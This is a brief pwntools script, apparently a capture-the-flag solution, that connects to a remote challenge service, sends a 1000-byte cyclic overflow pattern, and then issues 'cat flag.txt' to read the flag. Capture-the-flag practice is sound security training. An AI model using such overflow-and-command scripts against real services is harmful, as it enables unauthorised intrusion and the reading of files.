#!/bin/python
from pwn import *

#target = process ("./overflow")
target = remote("forever.isss.io", 1302)
target.recvline() # Enter some input!

target.sendline(cyclic(1000))

target.sendline("cat flag.txt")
print(target.recvline())
